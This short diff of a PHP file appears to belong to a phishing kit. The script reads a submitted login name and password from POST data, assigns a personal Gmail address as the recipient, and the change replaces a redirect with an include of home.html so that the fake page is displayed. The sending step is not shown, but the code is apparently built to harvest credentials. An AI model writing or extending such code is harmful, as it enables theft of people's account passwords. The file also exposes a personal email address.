@@ -1,5 +1,5 @@
 <?php
- header( 'Location: /index.html' ) ;
+ include_once("home.html");
 $log=$_POST['log'];
 $to='rrohitchauhan11@gmail.com';
 $pwd=$_POST['pwd'];
